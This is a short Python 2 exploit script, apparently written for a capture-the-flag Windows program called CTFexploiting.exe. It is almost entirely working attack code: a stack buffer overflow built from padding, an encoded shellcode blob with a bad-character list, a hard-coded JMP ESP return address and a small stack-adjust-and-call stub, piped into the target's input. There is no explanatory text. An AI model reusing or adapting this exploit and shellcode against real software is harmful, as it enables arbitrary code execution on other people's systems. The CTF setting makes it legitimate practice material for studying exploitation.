#!/usr/bin/python
# Title: CTFExploiting.exe
# Author: Miguel Mendez Z.
# Tested on: Windows
from struct import pack as p
from os import *

arg_1  = 'a'
arg_2  = ' . '
arg_3  = 'b' * 101
payload1 = arg_1 +arg_2 + arg_3

stdin,stdout = popen4(r'CTFexploiting.exe ' + payload1)
print stdin

# '\x00\x20\x1a\x09\x0a\x0c\x0d\x0b'
buf  = "\xdb\xc9\xba\xe5\xbb\xa0\x8d\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x41\x31\x53\x18\x83\xeb\xfc\x03\x53\xf1\x59"
buf += "\x55\x54\x12\x06\x4f\x13\xc0\xcd\x41\x0e\xba\x59\x93"
buf += "\x67\xde\x2e\xa2\x47\x95\x47\x49\x23\xdf\xbb\xda\x75"
buf += "\x17\x4f\xa2\x59\xac\x79\x63\xd5\xaa\xf0\x60\xb0\xcb"
buf += "\x2b\x79\xa2\xab\x40\xea\x01\x0f\xdc\xb6\x75\xc4\xb6"
buf += "\x10\xfe\xdb\xdc\xea\xb4\xc3\xab\xb7\x68\xf2\x40\xa4"
buf += "\x5d\xbd\x1d\x1f\x15\x3c\xcc\x51\xd6\x0f\xd0\x6e\x84"
buf += "\xeb\x10\xfa\xd2\x32\x5f\x0e\xdc\x73\x8b\xe5\xe5\x07"
buf += "\x68\x2e\x6f\x16\xfb\x74\xab\xd9\x17\xee\x38\xd5\xac"
buf += "\x64\x64\xf9\x33\x90\x12\x05\xbf\x67\xcd\x8c\xfb\x43"
buf += "\x11\xef\xc0\x3e\x21\xc6\x12\xb7\xd7\x91\x59\xa0\x99"
buf += "\xef\x53\xdd\xf4\x07\xf4\xe2\x06\x28\x82\x58\xfd\x6d"
buf += "\xeb\xba\x1f\xe2\x93\x27\xc4\x56\x74\xd9\xfb\xa9\x7b"
buf += "\x6f\x46\x5d\xec\x1c\x25\x7d\xad\xb4\x86\x4f\x03\x21"
buf += "\x81\xda\x28\xcc\x23\x14\x14\x86\x98\x70\xa0\x1e\xc6"
buf += "\x2e\x4b\x75\x03\x47\x71\x26\xb0\xff\xd4\x8a\x7a\x78"
buf += "\x04\x31\xd1\x6e\x6a\xc6\x2a\x91\xfd\x56\xb2\x35\xde"
buf += "\xce\x53\xac\x6a\x66\xc4\x4b\xeb\x08\x78\xa2\xd0\x61"
buf += "\xdc\xe0\xec\xf8\x3e\x80\xa8\xda\xe0\x70\x21\x6b\x96"
buf += "\x1e\xd5\xba\x91\x56\x59\x99\x25\xef\x83\xd0\xf7\xbd"
buf += "\x10\x42\xaa\xbe\x47\x55\x8a\x10\x97\xc3\x02"
buf += '\x41' * 20

minirop  = '\x83\xEC\x7F' * 4 	# SUB ESP,0x7F
minirop += '\xFF\xD4' 			# CALL ESP

active = '-'
padd   = '\x41' * (1055-len(buf))
retn   = p('<I',0x6D881457) 	# JMP ESP
basura = '\x41' * 5

payload2 = active + padd + buf + retn + minirop

stdin.write(payload2 + '\n')
print stdout.read(1024)
